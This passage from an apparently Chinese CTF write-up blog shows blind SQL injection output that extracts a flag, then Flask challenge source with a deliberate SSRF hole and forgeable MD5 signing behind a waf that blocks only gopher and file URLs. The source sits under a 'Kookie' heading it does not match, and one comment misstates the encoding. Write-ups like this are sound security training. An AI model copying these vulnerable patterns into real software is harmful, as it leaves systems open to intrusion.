class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclov</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclove</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,c</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_r</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_re</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_rea</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_real</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_reall</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_n</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_ne</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_nee</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_g</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_gr</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_gri</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_gril</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilf</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfr</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfri</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfrie</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfrien</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,f</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,fl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,fla</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;e</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;ed</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc22</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc228</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c3</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c34</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4b</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b47</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-7</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-734</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-7344</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0d</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0db</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0dbb</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0dbb4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0dbb43</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0dbb43&#125;</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;edc2283e-c340-4bb3-b477-73448d0dbb43&#125;</span><br><span class="line">你需要的flag为：flag&#123;edc2283e-c340-4bb3-b477-73448d0dbb43&#125;</span><br><span class="line"></span><br><span class="line">进程已结束,退出代码0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么，为什么放这么长的回显呢？</p>
<p>当然是怕你寂寞啦╮(￣▽ ￣)╭</p>
<p>继续刷题学习。</p>
<h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><h2 id="原始信息-24"><a href="#原始信息-24" class="headerlink" title="原始信息"></a>原始信息</h2><p>题目提示的单词和cookie有些相似，应该是cookie有利用点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secret_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secret_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提供的源码很长，是一个Python搭建的flask站点。</p>
<h2 id="解题-24"><a href="#解题-24" class="headerlink" title="解题"></a>解题</h2><p>尝试对源码进行分析：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两行编码，将程序设置为utf8的格式</span></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有程序必须创建的flask初始化程序实例</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 指定生成密钥长度为16的随机数</span></span><br><span class="line">secret_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        <span class="comment"># 此处应该是md5加密</span></span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="comment"># os.path.exists：判断指定路径是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            <span class="comment"># 创建指定文件夹</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                <span class="comment">#打开指定路径的文件并且写入</span></span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                <span class="comment">#这是下面的自定义函数</span></span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                	<span class="comment"># 如果返回链接超时就赋值给result[&#x27;data&#x27;]</span></span><br><span class="line">                	result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    <span class="comment"># 写入到文件对象</span></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    <span class="comment"># 结束文件的写入以及调用</span></span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    <span class="comment"># 状态码编辑为200</span></span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                <span class="comment"># 